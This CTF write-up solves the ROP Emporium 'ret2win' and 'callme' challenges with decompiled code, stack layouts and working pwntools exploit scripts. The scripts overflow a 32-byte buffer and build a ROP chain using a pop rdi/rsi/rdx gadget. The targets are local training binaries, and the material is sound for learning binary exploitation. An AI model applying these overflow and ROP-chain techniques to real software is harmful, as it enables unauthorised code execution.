---
title: "ROP Emporium: ret2win and callme"
date: 2019-01-01
description: "ROP Emporium challenge solutions: ret2win (basic ROP control flow hijack) and callme (chaining function calls with specific arguments)"
tags: ["ROP", "ROP-Emporium", "pwn", "binary-exploitation", "ret2win", "callme"]
platform: "wargame"
category: "pwn"
difficulty: "easy"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## ret2win

### Binary Info

```
checksec --file ret2win
[*] '/home/ubuntu/rop_emporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX is enabled, so shellcode on the stack won't execute. No PIE means addresses are fixed. No canary means no stack protection.

### Source Analysis

```c
int ret2win()
{
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}

int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h]

  memset(s, 0, 32uLL);
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
  printf("> ");
  read(0, s, 56uLL);
  return puts("Thank you!");
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

`pwnme` reads up to 56 bytes into a 32-byte buffer. The `ret2win` function prints the flag when called. Since there's no canary and no PIE, overwriting the return address with `ret2win`'s fixed address is straightforward.

### Stack Layout

```
gef> x/40xg $rsp
0x7fffffffe3f0:  0x4141414141414141  0x4141414141414141
0x7fffffffe400:  0x4141414141414141  0x4141414141414141
0x7fffffffe410:  0x00007fffffffe40a  0x00000000004006d7
0x7fffffffe420:  0x0000000000400780  0x00007ffff7a03bf7
```

```
buf[32] | SFP[8] | ret[8]
```

40 bytes of padding to reach the return address, then `ret2win`'s address.

### Exploit

```python
from pwn import *

p = process("./ret2win")

ret2win = 0x400756

payload = ''
payload += "A" * 40
payload += p64(ret2win)

print(p.recvuntil("> "))
p.sendline(payload)
p.interactive()
```

---

## callme

### Source Analysis

```c
void __fastcall __noreturn callme_three(__int64 a1, __int64 a2, __int64 a3)
{
  if ( a1 == 0xDEADBEEFDEADBEEF && a2 == 0xCAFEBABECAFEBABE && a3 == 0xD00DF00DD00DF00D )
  {
    // reads key2.dat, XORs buffer, prints flag
    puts(g_buf);
    exit(0);
  }
  puts("Incorrect parameters");
  exit(1);
}

int __fastcall callme_two(__int64 a1, __int64 a2, __int64 a3)
{
  if ( a1 != 0xDEADBEEFDEADBEEF || a2 != 0xCAFEBABECAFEBABE || a3 != 0xD00DF00DD00DF00D )
  {
    puts("Incorrect parameters");
    exit(1);
  }
  // reads key1.dat, XORs first 16 bytes of g_buf
  return puts("callme_two() called correctly");
}

int __fastcall callme_one(__int64 a1, __int64 a2, __int64 a3)
{
  if ( a1 != 0xDEADBEEFDEADBEEF || a2 != 0xCAFEBABECAFEBABE || a3 != 0xD00DF00DD00DF00D )
  {
    puts("Incorrect parameters");
    exit(1);
  }
  // reads encrypted_flag.dat into g_buf
  return puts("callme_one() called correctly");
}

int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h]

  memset(s, 0, 32uLL);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0, s, 512uLL);
  return puts("Thank you!");
}
```

Three functions must be called **in order** — `callme_one`, then `callme_two`, then `callme_three` — each with identical arguments `(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)`. On x86-64, arguments are passed in registers `rdi`, `rsi`, `rdx`.

### Strategy

The `pwnme` function reads up to 512 bytes — plenty of room for a full ROP chain. The plan:

1. Find a `pop rdi; pop rsi; pop rdx; ret` gadget (or equivalent)
2. Set all three argument registers before each call
3. Chain: `gadget → args → callme_one → gadget → args → callme_two → gadget → args → callme_three`

```bash
ROPgadget --binary callme | grep "pop rdi"
```

### Exploit

```python
from pwn import *

p = process("./callme")
elf = ELF("./callme")

# ROP gadget: pop rdi; pop rsi; pop rdx; ret
pop_rdi_rsi_rdx = 0x0000000000401ab0

callme_one   = elf.sym['callme_one']
callme_two   = elf.sym['callme_two']
callme_three = elf.sym['callme_three']

arg1 = 0xDEADBEEFDEADBEEF
arg2 = 0xCAFEBABECAFEBABE
arg3 = 0xD00DF00DD00DF00D

def call_with_args(func_addr):
    chain  = p64(pop_rdi_rsi_rdx)
    chain += p64(arg1)
    chain += p64(arg2)
    chain += p64(arg3)
    chain += p64(func_addr)
    return chain

payload  = b"A" * 40
payload += call_with_args(callme_one)
payload += call_with_args(callme_two)
payload += call_with_args(callme_three)

p.recvuntil("> ")
p.sendline(payload)
p.interactive()
```

The key insight is that x86-64 passes the first three arguments via `rdi`, `rsi`, `rdx` respectively. Each function call in the chain requires setting those registers first using a single pop gadget, then calling the target function.
